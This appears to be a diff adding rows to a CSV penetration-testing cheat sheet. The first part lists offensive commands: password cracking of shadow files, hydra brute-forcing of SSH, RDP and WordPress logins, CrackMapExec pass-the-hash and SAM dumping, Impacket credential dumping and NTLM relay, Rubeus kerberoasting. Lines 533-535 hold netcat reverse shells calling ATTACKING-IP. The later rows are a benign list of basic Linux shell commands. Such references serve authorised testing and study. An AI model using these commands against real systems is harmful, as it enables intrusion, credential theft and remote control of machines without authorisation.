+525,gobuster dir -u http://<IP> -w <wordlist> -x <extention> -c PHPSESSID=<cookie val>,Eunmerate directories on a website with a cookie,
+526,sqlmap -u <IP> --batch --force-ssl,map sql at an IP,SQLMap
+527,john <HASHES_FILE> --wordlist=<wordlist>,Use wordlist to parse hash,
+528,john <Unshadowed passwds>,unencrypt shadow file,
+529,unshadow <passwd> <shadow>,combine /etc/passwd and /etc/shadow file for cracking,
+530,hashcat -m <hash type> -a 0 -o <output file> <hash file> <wordlist> --force,crack hashes with a wordlist,
+531,enum4linux -a <IP>,basic command,
+532,smbclinet //<IP>/<share> -U <username>,connect to a SMB share,
+533,nc -e /bin/sh <ATTACKING-IP> 80,connect with shell (-e normally disabled for security),
+534,/bin/sh | nc ATTACKING-IP 80,connect with shell (-e doest always work),
+535,rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p,done on the target,
+536,bash -x <.sh file>,for stepping through bash script and debugging,Bash
+537,sqlmap -u <URL> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3,automated SQL scan,SQLMap
+538,crackmapexec smb <target(s)> -u <username> -p <password> --local-auth -M <module>,run a mimikatz module,CrackMapExec
+539,crackmapexec smb <target(s)> -u '<username>' -p '<password>' -x whoami,Command execution,CrackMapExec
+540,crackmapexec smb <target(s)> -u '<username>' -p '<password>' --lusers,check logged in users,CrackMapExec
+541,crackmapexec <target(s)> -u '<uesrname>' -p '<password>' --local-auth --sam,dump local SAM hashes,CrackMapExec
+542,crackmapexec smb <target(s)> -u '' -p '',null session login,CrackMapExec
+543,cme <protocol> -L,list modules,CrackMapExec
+544,crackmapexec smb <target(s)> -u username -H (LMHASH:)NTHASH,pass the hash,CrackMapExec
+545,psk-crack -d </path/to/dictionary> <psk file>,attack pre shared key with dictionary,PSK-Crack
+546,ike-scan <IP> -A -id GroupVPN,"If you find a SonicWALL VPN using agressive mode it will require a group id, the default group id is GroupVPN",IKE-Scan
+547,ike-scan <IP> -A -P<file out>,to find aggressive mode VPNs and save for use with psk-crack,IKE-Scan
+548,for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\] -f 1`; do ./john --rules:${ruleset} -w:<wordlist> <password_file> ; done,crack passwords with korelogic rules,
+549,"nmap -sL -n 192.168.1.1-100,102-254 | grep ""report for"" | cut -d "" "" -f 5 > ip_list_192.168.1.txt",create a list of ip addresses,Nmap
+550,mount -t nfs server:/share /mnt/point,mount NFS share on linux,
+551,net user <username> <password> /ADD,create new user,
+552,net localgroup <group> <username> /ADD,add user to a group (normaly Administrators),
+553,"psk-crack -b <#> --charset=""<charlist>"" <key file>",brute force with specified length and specified chars (if left blank default is 36),PSK-Crack
+554,psk-crack -d <file> <key file>,dictianary attack,PSK-Crack
+555,"sqlmap -o -u ""<url of form>"" --forms",check form for SQL injection,SQLMap
+556,"sqlmap -u ""<form URL>?id=1>"" --dbms=mysql --tech=U --random-agent --dump",Scan url for union + error based injection with mysql backend and use a random user agent + database dump,SQLMap
+557,sessions -u <session #>,Upgrade a shell to meterpreter in metasploit,Metasploit
+558,hydra -P <wordlist> -v <ip> <protocol>,Brute force against a protocol of your choice,Hydra
+559,hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>,"You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)",Hydra
+560,hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>,Attack a Windows Remote Desktop with a password list.,Hydra
+561,hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location',Craft a more specific request for Hydra to brute force.,Hydra
+562,certutil -urlcache -f <url of file> <output file name>,download file using windows cmd.exe,Cmd
+563,"powershell -c wget ""<url of file>"" -outfile ""<output file name>""",Download file from cmd using pwershell,Cmd
+564,psexec.py [[domain/] username [: password] @] [Target IP Address],,psexec.py
+565,smbexec -hashes <LM hash:NTLM Hash> <name>@<IP>,,smbexec.py
+566,atexec.py [[domain/] username [: password] @] [Target IP Address] [Command],,atexec.py
+567,wmiexec.py [[domain/] username [: password] @] [Target IP Address],,wmiexec.py
+568,GetUserSPNs.py -request -dc-ip <DC IP> <IP>/<user>,,GetUserSPNs.py
+569,ticketConverter.py raj.ccache ticket.kirbi,,ticketConverter.py
+570,ticketer.py -nthash <hash> -domain-sid [e.g. S-1-5-21-3523557010-2506964455-2614950430] -domain <domain IP/name> <user,,ticketer.py
+571,secretsdump.py -just-dc-ntlm <Domain name>/<username>@<IP>,,secretsdump.py
+572,wmiquery.py [[domain/] username [: password] @] [Target IP Address],,wmiquery.py
+573,smbclient.py <domain>/<user>:<password/hash>@<Target IP Address>,Mini shell using some of the SMB funcionality of the library using username and password/NTLM hash,smbclient.py
+574,getArch.py -target(s) <Target (List)>,,getArch.py
+575,lookupsid.py <domain>/<user>:<password/hash>@<Target IP Address>,,lookupsid.py
+576,netview.py <domain>/<User> -target(s) <Target (List)> -users <User List>,,netview.py
+577,reg.py <domain>/<user>:<password/hash>@<Target IP Address> <action> <action parameter>,,reg.py
+578,rpcdump.py [[domain/] username [: password] @] [Target IP Address],,rpcdump.py
+579,rpcdump.py [domain]/[user]:[Password/Password Hash]@[Target IP Address],,rpcmap.py
+580,samrdump.py [domain]/[user]:[Password/Password Hash]@[Target IP Address],,samrdump.py
+581,services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action],,services.py
+582,mssqlclient.py -windows-auth <domain name>/<username>@<IP>,,mssqlclient.py
+583,GetADUSers.py -all <IP>l/<Username>:<password/hash>@987 -dc-ip <domain IP>,,GetADUsers.py
+584,sniff.py,packet sniffer that listens and creates pcap file,sniff.py
+585,sniffer.py,listens for specific protocols,sniffer.py
+586,ping.py [Source IP] [Destination IP],,ping.py
+587,ifmap.py [Target IP Address] [Target Port],,ifmap.py
+588,opdump.py [Target IP Address] [Port Interface Version],,opdump.py
+589,esentutl.py databaseFile (dump|info|export),"An Extensibe Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit)",esentutl.py
+590,GetADUsers.py domain/user:password@IP,This script will gather data about the domain's users and their corresponding email addresses.,GetADUsers.py
+591,getArch.py -target(s) <IP (List.txt)>,This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed,getArch.py
+592,goldenPac.py domain/user:password@IP,Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.,goldenPac.py
+593,ifmap.py <target IP> <target port>,his script will bind to the target's MGMT interface to get a list of interface IDs,ifmap.py
+594,karmaSMB.py <filenamePathname> (-smb2support),A SMB Server that answers specific file contents regardless of the SMB share and pathname spec,karmaSMB.py
+595,lookupsid.py domain/user:password@IP,A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface aiming at finding remote users/groups,lookupsid.py
+596,mimikatz.py domain/user:password@IP,Mini shell to control a remote mimikatz RPC server,mimikatz.py
+597,mqtt_check.py domain/user:password@IP (-ssl),Simple MQTT example aimed at playing with different login options.,mqtt_check.py
+598,mssqlinstance.py <target IP>,Retrieves the MSSQL instances names from the target host,mssqlinstance.py
+599,netview.py <domain>/<user>:<password> -target <IP>,Gets a list of the sessions opened at the remote hosts,netview.py
+600,ntfs-read.py /dev/disk1,"This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents.",ntfs-read.py
+601,"ntlmrelayx.py -tf targets.txt (-c ""ipconfig"")","This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.) By default, it dumps the SAM database",ntlmrelayx.py
+602,opdump.py <hostname> <port> <interface> <version>,"This binds to the given hostname:port and MSRPC interface. Then, it tries to call each of the first 256 operation numbers in turn and reports the outcome of each call Need to get interfaces, for example with ifmap.py",opdump.py
+603,ping.py <src-ip> <dst-ip>,Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.,ping.py
+604,ping6.py <src-ip> <dst-ip>,Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.,ping6.py
+605,rdp_check.py domain/user:password@IP,[MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP  auth. This example test whether an account is valid on the target host.,rdp_check.py
+606,reg.py domain/user:password@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s,Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. (similar to reg.exe),reg.py
+607,rpcdump.py <domain>/<user>:<password>@<IP>,This script will dump the list of RPC endpoints and string bindings registered at thetarget. It will also try to match them with a list of well known endpoints.,rpcdump.py
+608,samrdump.py <server>/<user>:<password>@<IP>,"An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service.",samrdump.py
+609,secretsdump.py -just-dc-ntlm domain/user:password@IP,secretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH,secretsdump.py
+610,services.py  <server>/<user>:<password>@<IP> <start|stop|delete|status|config|list|create|change),This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface.,services.py
+611,smbrelayx.py -h victimIP -c cmdToExecute,Exploit for CVE-2015-0005 using a SMB Relay Attack.,smbrelayx.py
+612,smbserver.py <SHARENAME> </path/to/your/local/share> (--username <user> --password <password>),A Python implementation of an SMB server. Allows to quickly set up shares and user accounts,smbserver.py
+613,wmipersist.py domain/user:password@IP <install/remove>,This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.,wmipersist.py
+614,wmiquery.py domain/user:password@IP,It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account).,wmiquery.py
+615,goldenPac.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.,goldenPac.py
+616,smbrelayx.py -h victimIP -e payload.exe,Exploit for CVE-2015-0005 using a SMB Relay Attack.,smbrelayx.py
+617,lookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface aiming at finding remote users/groups,lookupsid.py
+618,mimikatz.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,Mini shell to control a remote mimikatz RPC server,mimikatz.py
+619,rdp_check.py <domain>/<username>@<IP> -hashes <LMHASH:NTHASH>,Enumerates RDP,rdp_check.py
+620,reg.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password,Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. (similar to reg.exe),reg.py
+621,rpcdump.py -dc-ip <domain controler IP/hosts file name> -target-ip <IP> <domain>/<user>:<password>,This script will dump the list of RPC endpoints and string bindings registered at thetarget. It will also try to match them with a list of well known endpoints.,rpcdump.py
+622,mssqlclient.py -windows-auth htb.local/mssql-svc@10.10.x.x,"An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.",mssqlinstance.py
+623,"ntfs-read.py ""\C:"" (-extract ""\windows\system32\config\sam"")","This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents.",ntfs-read.py
+624,hydra -P password-file.txt -v <IP> snmp,Hydra brute force against SNMP,Hydra
+625,hydra -t 1 -l <username> -P <password.txt> -vV <IP> ftp,Hydra FTP known user and password list,Hydra
+626,hydra -v -V -u -L <usernames.txt> -P <passwords.txt> -t 1 -u <IP> ssh,Hydra SSH using list of users and passwords,Hydra
+627,"hydra -v -V -u -L <usersnames.txt> -p """" -t 1 -u <IP> ssh",Hydra SSH using a known password and a username list,Hydra
+628,hydra <IP> -s <port (22)> ssh -l -P big_wordlist.txt,Hydra SSH Against Known username on port,Hydra
+629,hydra -l <username> -P <password-list.txt> -f <IP> pop3 -V,Hydra POP3 Brute Force,Hydra
+630,hydra -P <passwords.txt> <IP> smtp -V,Hydra SMTP Brute Force,Hydra
+631,hydra -L <usernames.txt> -P <passwords.txt> <IP> http-get /<path to form>,Hydra attack http get 401 login with a dictionary,Hydra
+632,hydra -t 1 -V -f -l <username> -P <passwords.txt> rdp://<IP>,Hydra attack Windows Remote Desktop with rockyou,Hydra
+633,hydra -t 1 -V -f -l <username> -P <password file> <IP> smb,Hydra brute force SMB,Hydra
+634,hydra -l <username> -P <passwordlist.txt> <IP> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location',Hydra brute force a Wordpress admin login,Hydra
+635,hydra -L <usernames.txt> -P <passwords.txt> <IP> smb -V -f,SMB Brute Forcing,Hydra
+636,hydra -L <usernames.txt> -P <passwords.txt> <IP> ldap2 -V -f,LDAP Brute Forcing,Hydra
+637,Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec],"Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:",Rubeus
+638,Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec],"Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:",Rubeus
+639,"Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec]","Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:",Rubeus
+640,Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap],"Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:",Rubeus
+641,Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap],Perform a Kerberos-based password bruteforcing attack:,Rubeus
+642,Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self],Perform S4U constrained delegation abuse:,Rubeus
+643,Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit],Perform S4U constrained delegation abuse:,Rubeus
+644,Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self],Perform S4U constrained delegation abuse across domains,Rubeus
+645,Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID],"Submit a TGT, optionally targeting a specific LUID (if elevated)",Rubeus
+646,Rubeus.exe purge [/luid:LOGINID],"Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated)",Rubeus
+647,Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>,Parse and describe a ticket (service ticket or TGT),Rubeus
+648,Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM],"Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:",Rubeus
+649,Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM],Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM],Rubeus
+650,Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap],"Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:",Rubeus
+651,Rubeus.exe tgtdeleg [/target:SPN],"Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:",Rubeus
+652,Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS],Monitor every /interval SECONDS (default 60) for new TGTs:,Rubeus
+653,Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS],"Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):",Rubeus
+654,"Rubeus.exe kerberoast [[/spn:""blah/blah""] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]",Perform Kerberoasting,Rubeus
+655,"Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:""blah/blah""] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]","Perform Kerberoasting, outputting hashes to a file:",Rubeus
+656,"Rubeus.exe kerberoast /simple [[/spn:""blah/blah""] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]","Perform Kerberoasting, outputting hashes in the file output format, but to the console",Rubeus
+657,"Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]",Perform Kerberoasting with alternate credentials,Rubeus
+658,"Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]",Perform Kerberoasting with an existing TGT,Rubeus
+659,"Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]",Perform Kerberoasting with an existing TGT using an enterprise principal,Rubeus
+660,Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/nowrap],Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:,Rubeus
+661,Rubeus.exe kerberoast /usetgtdeleg [/nowrap],Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:,Rubeus
+662,Rubeus.exe kerberoast /rc4opsec [/nowrap],"Perform ""opsec"" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts",Rubeus
+663,Rubeus.exe kerberoast /stats [/nowrap],List statistics about found Kerberoastable accounts without actually sending ticket requests,Rubeus
+664,Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/nowrap],"Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter)",Rubeus
+665,Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap],"Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:",Rubeus
+666,Rubeus.exe kerberoast /aes [/nowrap],Perform AES Kerberoasting:,Rubeus
+667,"Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""] [/nowrap]","Perform AS-REP ""roasting"" for any users without preauth",Rubeus
+668,"Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]","Perform AS-REP ""roasting"" for any users without preauth, outputting Hashcat format to a file",Rubeus
+669,"Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""] [/nowrap]","Perform AS-REP ""roasting"" for any users without preauth using alternate credentials",Rubeus
+670,"Rubeus.exe createnetonly /program:""C:\Windows\System32\cmd.exe"" [/show]","Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:",Rubeus
+671,Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER],Reset a user's password from a supplied TGT,Rubeus
+672,Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN],"Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes",Rubeus
+673,Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap],Substitute an sname or SPN into an existing service ticket,Rubeus
+674,Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap],Substitute an sname or SPN into an existing service ticket,Rubeus
+675,Rubeus.exe currentluid,Display the current user's LUID,Rubeus
+676,kerbrute -domain <domain name> -users <users.txt> -passwords <passwords.txt> -outputfile <file name>,Eunmerate domain with username and corrisponding passwords,Kerbrute
+677,smbclient -U <username. //<IP>/<share>,for connecting to a SMB share as a different user,SMBClient
+678, apropos,Search Help manual pages (man -k),Shell
+679, apt-get,Search for and install software packages (Debian),Shell
+680, aptitude,Search for and install software packages (Debian),Shell
+681, aspell,Spell Checker,Shell
+682, awk,"Find and Replace text, database sort/validate/index",Shell
+683, basename,Strip directory and suffix from filenames,Shell
+684, bash,Boot new Bourne-Again Shell,Shell
+685, bc,Arbitrary precision calculator language,Shell
+686, bg,Send to background,Shell
+687, break,Exit from a loop,Shell
+688, builtin,Run a shell builtin,Shell
+689, bzip2,Compress or decompress named files,Shell
+690, cal,Display a calendar,Shell
+691, case,Conditionally perform a command,Shell
+692, cat,Concatenate and print (display) the content of files,Shell
+693, cd,Change Directory,Shell
+694, cfdisk,Partition table manipulator for Linux,Shell
+695, chgrp,Change group ownership,Shell
+696, chmod,Change access permissions,Shell
+697, chown,Change file owner and group,Shell
+698, chroot,Run a command with a different root directory,Shell
+699, chkconfig,System services (runlevel),Shell
+700, cksum,Print CRC checksum and byte counts,Shell
+701, clear,Clear terminal screen,Shell
+702, cmp,Compare two files,Shell
+703, comm,Compare two sorted files line by line,Shell
+704, command,Run a command – ignoring shell functions,Shell
+705, continue,Resume the next iteration of a loop,Shell
+706, cp,Copy one or more files to another location,Shell
+707, cron,Daemon to execute scheduled commands,Shell
+708, crontab,Schedule a command to run at a later time,Shell
+709, csplit,Split a file into context-determined pieces,Shell
+710, cut,Divide a file into several parts,Shell
+711, date,Display or change the date and time,Shell
+712, dc,Desk Calculator,Shell
+713, dd,"Convert and copy a file, write disk headers, boot records",Shell
+714, ddrescue,Data recovery tool,Shell
+715, declare,Declare variables and give them attributes,Shell
+716, df,Display free disk space,Shell
+717, diff,Display the differences between two files,Shell
+718, diff3,Show differences among three files,Shell
+719, dig,DNS lookup,Shell
+720, dir,Briefly list directory contents,Shell
+721, dircolors,Colour setup for `ls’,Shell
+722, dirname,Convert a full pathname to just a path,Shell
+723, dirs,Display list of remembered directories,Shell
+724, dmesg,Print kernel &amp; driver messages,Shell
+725, du,Estimate file space usage,Shell
+726, echo,Display message on screen,Shell
+727, egrep,Search files for lines that match an extended expression,Shell
+728, eject,Eject removable media,Shell
+729, enable,Enable and disable builtin shell commands,Shell
+730, env,Environment variables,Shell
+731, ethtool,Ethernet card settings,Shell
+732, eval,Evaluate several commands/arguments,Shell
+733, exec,Execute a command,Shell
+734, exit,Exit the shell,Shell
+735, expect,Automate arbitrary applications accessed over a terminal,Shell
+736, expand,Convert tabs to spaces,Shell
+737, export,Set an environment variable,Shell
+738, expr,Evaluate expressions,Shell
+739, false,"Do nothing, unsuccessfully",Shell
+740, fdformat,Low-level format a floppy disk,Shell
+741, fdisk,Partition table manipulator for Linux,Shell
+742, fg,Send job to foreground,Shell
+743, fgrep,Search files for lines that match a fixed string,Shell
+744, file,Determine file type,Shell
+745, find,Search for files that meet a desired criteria,Shell
+746, fmt,Reformat paragraph text,Shell
+747, fold,Wrap text to fit a specified width,Shell
+748, for,"Expand words, and execute commands",Shell
+749, format,Format disks or tapes,Shell
+750, free,Display memory usage,Shell
+751, fsck,File system consistency check and repair,Shell
+752, ftp,File Transfer Protocol,Shell
+753, function,Define Function Macros,Shell
+754, fuser,Identify/kill the process that is accessing a file,Shell
+755, gawk,Find and Replace text within files,Shell
+756, getopts,Parse positional parameters,Shell
+757, grep,Search files for lines that match a given pattern,Shell
+758, groupadd,Add a user security group,Shell
+759, groupdel,Delete a group,Shell
+760, groupmod,Modify a group,Shell
+761, groups,Print group names a user is in,Shell
+762, gzip,Compress or decompress named files,Shell
+763, hash,Remember the full pathname of a name argument,Shell
+764, head,Output the first part of files,Shell
+765, help,Display help for a built-in command,Shell
+766, history,Command History,Shell
+767, hostname,Print or set system name,Shell
+768, iconv,Convert the character set of a file,Shell
+769, id,Print user and group id’s,Shell
+770, if,Conditionally perform a command,Shell
+771, ifconfig,Configure a network interface,Shell
+772, ifdown,Stop a network interface,Shell
+773, ifup,Start a network interface up,Shell
+774, import,Capture an X server screen and save the image to file,Shell
+775, install,Copy files and set attributes,Shell
+776, jobs,List active jobs,Shell
+777, join,Join lines on a common field,Shell
+778, kill,Stop a process from running,Shell
+779, killall,Kill processes by name,Shell
+780, less,Display output one screen at a time,Shell
+781, let,Perform arithmetic on shell variables,Shell
+782, ln,Create a symbolic link to a file,Shell
+783, local,Create variables,Shell
+784,locate,Find files,Shell
+785, logname,Print current login name,Shell
+786, logout,Exit a login shell,Shell
+787, look,Display lines beginning with a given string,Shell
+788, lpc,Line printer control program,Shell
+789, lpr,Off line print,Shell
+790, lprint,Print a file,Shell
+791, lprintd,Abort a print job,Shell
+792, lprintq,List the print queue,Shell
+793, lprm,Remove jobs from the print queue,Shell
+794, ls,List information about files,Shell
+795, lsof,List open files,Shell
+796, make,Recompile a group of programs,Shell
+797, man,Help manual,Shell
+798, mkdir,Create new folders,Shell
+799, mkfifo,Make FIFOs (named pipes),Shell
+800, mkisofs,Create an hybrid ISO9660/JOLIET/HFS filesystem,Shell
+801, mknod,Make block or character special files,Shell
+802, more,Display output one screen at a time,Shell
+803, mount,Mount a file system,Shell
+804, mtools,Manipulate MS-DOS files,Shell
+805, mtr,Network diagnostics (traceroute/ping),Shell
+806, mv,Move or rename files or directories,Shell
+807, mmv,Mass Move and rename files,Shell
+808, netstat,Networking information,Shell
+809, nice,Set the priority of a command or job,Shell
+810, nl,Number lines and write files,Shell
+811, nohup,Run a command immune to hangups,Shell
+812, notify-send,Send desktop notifications,Shell
+813, nslookup,Query Internet name servers interactively,Shell
+814, open,Open a file in its default application,Shell
+815, op,Operator access,Shell
+816, passwd,Modify a user password,Shell
+817, paste,Merge lines of files,Shell
+818, pathchk,Check file name portability,Shell
+819, ping,Test a network connection,Shell
+820, pkill,Stop processes from running,Shell
+821, popd,Restore the previous value of the current directory,Shell
+822, pr,Prepare files for printing,Shell
+823, printcap,Printer capability database,Shell
+824, printenv,Print environment variables,Shell
+825, printf,Format and print data,Shell
+826, ps,Process status,Shell
+827, pushd,Save and then change the current directory,Shell
+828, pwd,Print Working Directory,Shell
+829, quota,Display disk usage and limits,Shell
+830, quotacheck,Scan a file system for disk usage,Shell
+831, quotactl,Set disk quotas,Shell
+832, ram,ram disk device,Shell
+833, rcp,Copy files between two machines,Shell
+834, read,Read a line from standard input,Shell
+835, readarray,Read from stdin into an array variable,Shell
+836, readonly,Mark variables/functions as readonly,Shell
+837, reboot,Reboot the system,Shell
+838, rename,Rename files,Shell
+839, renice,Alter priority of running processes,Shell
+840, remsync,Synchronize remote files via email,Shell
+841, return,Exit a shell function,Shell
+842, rev,Reverse lines of a file,Shell
+843, rm,Remove files,Shell
+844, rmdir,Remove folders,Shell
+845, rsync,Remote file copy (Synchronize file trees),Shell
+846, screen,"Multiplex terminal, run remote shells via ssh",Shell
+847, scp,Secure copy (remote file copy),Shell
+848, sdiff,Merge two files interactively,Shell
+849, sed,Stream Editor,Shell
+850, select,Accept keyboard input,Shell
+851, seq,Print numeric sequences,Shell
+852, set,Manipulate shell variables and functions,Shell
+853, sftp,Secure File Transfer Program,Shell
+854, shift,Shift positional parameters,Shell
+855, shopt,Shell Options,Shell
+856, shutdown,Shutdown or restart linux,Shell
+857, sleep,Delay for a specified time,Shell
+858, slocate,Find files,Shell
+859, sort,Sort text files,Shell
+860, source,Run commands from a file,Shell
+861, split,Split a file into fixed-size pieces,Shell
+862, ssh,Secure Shell client (remote login program),Shell
+863, strace,Trace system calls and signals,Shell
+864, su,Substitute user identity,Shell
